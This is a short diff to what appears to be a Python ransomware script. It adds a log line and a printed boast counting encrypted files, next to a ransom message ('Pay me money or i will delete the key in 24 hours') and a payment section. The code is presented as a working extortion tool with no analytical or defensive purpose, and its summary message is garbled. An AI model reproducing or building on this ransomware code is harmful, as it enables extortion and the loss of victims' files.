@@ -49,11 +49,13 @@ def Get_root_files(path) :
           current = current.replace(char,'')
 Get_root_files(working_directory)
 
+logging.log(msg = f'SUMMARY : {sucesss} was sucessufully encrypted out of {failed}',level = logging.DEBUG)
 print(colorama.Fore.RED + 'You have been hacked')
 print('All your files are encrypted')
 print('Pay me money or i will delete the key in 24 hours ....')
-#time.sleep(6)
+print('i have {} files encrypted already !!'.format(sucesss))
 print(colorama.Style.RESET_ALL + colorama.Style.BRIGHT)
+
 
 
 # intializing mode for payment
